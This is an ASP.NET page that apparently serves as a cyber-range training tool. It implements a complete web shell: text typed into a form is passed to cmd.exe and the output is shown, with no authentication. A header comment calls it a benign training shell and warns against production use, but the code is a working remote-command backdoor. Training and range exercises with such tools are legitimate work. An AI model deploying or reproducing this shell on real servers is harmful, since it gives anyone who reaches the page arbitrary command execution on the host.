<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%-- 
  TRAINING WEBSHELL — Project Raptor / CIRT Cyber Range
  This is a BENIGN training tool. It executes commands on the host.
  DO NOT deploy this on any production system.
--%>
<html>
<body>
<form runat="server">
<asp:TextBox id="cmd" runat="server" Width="400" />
<asp:Button id="run" runat="server" Text="Run" OnClick="exec" />
<pre><asp:Literal id="output" runat="server" /></pre>
</form>
<script runat="server">
void exec(object s, EventArgs e) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd.Text;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    output.Text = Server.HtmlEncode(p.StandardOutput.ReadToEnd());
    p.WaitForExit();
}
</script>
</body>
</html>
